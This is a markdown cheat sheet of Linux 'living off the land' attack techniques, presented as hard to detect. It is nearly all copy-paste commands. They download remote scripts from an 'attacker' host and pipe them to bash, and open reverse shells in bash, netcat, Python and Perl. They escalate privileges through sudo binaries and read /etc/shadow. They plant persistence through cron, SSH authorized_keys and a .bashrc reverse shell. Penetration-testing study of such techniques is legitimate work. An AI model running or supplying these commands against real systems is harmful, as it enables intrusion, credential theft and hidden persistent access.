# Linux Living off the Land (LOTL)

Using built-in Linux tools for attacks (harder to detect).

**Reference:** [GTFOBins](https://gtfobins.github.io/)

---

## Download Files

### curl
```bash
curl http://attacker/file -o file
curl http://attacker/script.sh | bash
```

### wget
```bash
wget http://attacker/file
wget http://attacker/script.sh -O - | bash
```

### nc (Netcat)
```bash
# Receiver
nc -lvnp 4444 > file

# Sender
nc target 4444 < file
```

### Python
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker/file', 'file')"
```

### PHP
```bash
php -r "file_put_contents('file', file_get_contents('http://attacker/file'));"
```

---

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/attacker/4444 0>&1
```

### Netcat
```bash
nc attacker 4444 -e /bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 >/tmp/f
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl
```bash
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

---

## Privilege Escalation via SUID/Sudo

Check [GTFOBins](https://gtfobins.github.io/) for specific binaries.

### Common Examples
```bash
# Find with sudo permissions
sudo -l

# vim
sudo vim -c ':!/bin/bash'

# find
sudo find . -exec /bin/bash \;

# python
sudo python3 -c 'import os; os.system("/bin/bash")'

# less
sudo less /etc/passwd
!/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (old versions)
sudo nmap --interactive
!bash
```

---

## File Reading

### cat / head / tail
```bash
cat /etc/shadow
head -n 20 /etc/passwd
tail -n 20 /var/log/auth.log
```

### less / more
```bash
less /etc/shadow
more /etc/passwd
```

### xxd (Hex dump)
```bash
xxd /etc/shadow
```

### base64
```bash
base64 /etc/shadow | base64 -d
```

---

## File Writing

### echo / printf
```bash
echo "malicious content" >> /etc/cron.d/evil
printf "content" > file
```

### tee
```bash
echo "content" | sudo tee /etc/file
echo "content" | sudo tee -a /etc/file  # append
```

---

## Reconnaissance

### System Info
```bash
uname -a
cat /etc/os-release
hostname
id
whoami
```

### Network
```bash
ip addr
ip route
ss -tulpn
netstat -antp
cat /etc/hosts
cat /etc/resolv.conf
```

### Users
```bash
cat /etc/passwd
cat /etc/shadow  # needs root
cat /etc/group
w
last
```

### Processes
```bash
ps aux
ps auxf
top
```

### Services
```bash
systemctl list-units --type=service
service --status-all
```

---

## Persistence

### Cron
```bash
(crontab -l; echo "* * * * * /path/to/shell") | crontab -
echo "* * * * * root /path/to/shell" >> /etc/crontab
```

### SSH Keys
```bash
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys
```

### Bashrc
```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1' &" >> ~/.bashrc
```

---

## Compression & Encoding

### tar
```bash
tar -cvf archive.tar /path
tar -xvf archive.tar
```

### gzip
```bash
gzip file
gunzip file.gz
```

### base64
```bash
base64 file > encoded.txt
base64 -d encoded.txt > file
```

### xxd (Hex)
```bash
xxd file > hex.txt
xxd -r hex.txt > file
```

---

## Spawning TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
echo os.system('/bin/bash')
/bin/sh -i
```

---

## Port Scanning with Bash

```bash
# Simple port check
echo >/dev/tcp/target/80 && echo "open" || echo "closed"

# Port scan loop
for port in 21 22 80 443; do
    (echo >/dev/tcp/target/$port) 2>/dev/null && echo "Port $port open"
done
```

---

## Resources

- [GTFOBins](https://gtfobins.github.io/)
- [RevShells](https://www.revshells.com/)
